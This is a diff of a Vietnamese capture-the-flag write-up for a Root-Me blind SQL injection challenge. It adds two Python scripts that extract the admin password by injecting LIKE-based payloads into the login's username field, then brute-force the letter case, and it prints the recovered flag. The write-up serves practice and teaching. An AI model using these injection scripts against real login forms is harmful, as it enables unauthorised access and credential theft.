@@ -28,9 +28,11 @@ Có báo lỗi và ta thấy database bài này đang chạy SQLite3.Mình sẽ 
 
 Adu mình vào được user1 nhưng mà hâu như trong đây không có gì đáng chú ý.
 
-Vậy bài này ta có thể khai thác ở phần login. Challenge lần này là `Blind`. Ý tưởng là ta sẽ cắt các kí tự đầu của password rồi đem đi so sánh, nếu password đó trả về là "Welcome back Admin" thì nó sẽ là password đúng. Vậy ta có thể dùng toán tử [LIKE](https://laptrinhtudau.com/toan-tu-like-trong-sql/) hoặc dùng [SQLmap](https://github.com/sqlmapproject/sqlmap)
+Vậy bài này ta có thể khai thác ở phần login. Challenge lần này là `Blind`. Ý tưởng là ta sẽ cắt các kí tự đầu của password rồi đem đi so sánh, nếu password đó trả về là "Welcome back Admin" thì nó sẽ là password đúng. Vậy ta có thể dùng toán tử [LIKE](https://laptrinhtudau.com/toan-tu-like-trong-sql/)  dựa trên idea đó. Hoặc dùng [SQLmap](https://github.com/sqlmapproject/sqlmap)
 
 # Solution:
+
+# 1ST
 
 Bước đầu cần xác định số column
 
@@ -64,4 +66,67 @@ Kết quả trả về 1 bảng là users. Ta thực hiện dump toàn bộ dữ
 
 Và ta đã có flag `e2azO93i`
 
+# 2nd:
+
+Và như mình đã nói ở trên các bạn có thể dùng toán tử LIKE để làm bài. Mình sẽ làm ở đây:
+```
+import sys
+import requests
+import string
+
+URL='http://challenge01.root-me.org/web-serveur/ch10/'
+character_list = string.printable
+pw = ''
+tmpPassword = ''
+
+while (True):
+    for char in character_list:
+        tmpPassword = pw + char
+        data = {
+            'username':"admin' and password LIKE '"+ tmpPassword + "%'--",
+            'password': 'asdasdasdasds'
+        }
+        http = requests.post(url = URL, data = data)
+        if http.text.find('Welcome back admin !</h2><h3>Your informations :</h3><p>- username : admin</p><br />Hi master ! <b>To validate the challeng')!=-1:
+            pw = tmpPassword
+            print("Matched:",pw)
+            break
+    print("Finished!")
+```
+
+Sau đó mình có kết quả là `e2azo93i`. Nhưng lưu ý ở đây là LIKE không xác định được uppercase hay lowercase. Vậy thì ta brute force lại 1 lần nữa.Trong password có 5 kí tự thường vậy thì 2^5 = 32 trường hợp.
+
+```
+ # Step 2: Generate password
+
+import sys
+import requests
+import string
+
+URL='http://challenge01.root-me.org/web-serveur/ch10/'   
+
+listPassword = []
+strPassword = ''
+for c1 in ['e', 'E']:
+    for c3 in ['a', 'A']:
+        for c4 in ['z', 'Z']:
+            for c5 in ['o', 'O']:
+                for c8 in ['i', 'I']:
+                    strPassword = c1 + '2' + c3 + c4 + c5 + '93' + c8
+                    listPassword.append(strPassword)
+                    
+print("### Start to attack ###")
+for password in listPassword:
+    data = {
+        'username':"admin' and password='"+ password + "'--",
+        'password': 'wedontneedthis'
+    }
+    http = requests.post(url = URL, data = data)
+    if http.text.find('Welcome back admin !</h2><h3>Your informations :</h3><p>- username : admin</p><br />Hi master ! <b>To validate the challeng')!=-1:
+        print("Got it: ", password)
+```
+
+![image](https://user-images.githubusercontent.com/115911041/234212578-8eab86ff-6e9b-4406-96c0-baf95c81f17e.png)
+
+Và ta đã ra được flag.
 
